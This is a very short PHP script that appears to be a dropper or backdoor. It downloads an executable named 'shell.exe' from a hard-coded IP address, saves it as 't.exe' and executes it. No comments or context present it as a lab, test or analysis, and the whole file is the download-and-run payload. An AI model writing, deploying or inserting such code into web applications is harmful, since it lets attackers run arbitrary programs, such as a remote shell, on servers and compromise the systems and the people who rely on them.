<?php
$bd = "http://192.168.22.31/shell.exe";
$data = file_get_contents($bd);
file_put_contents("t.exe", $data);
exec("t.exe");
?>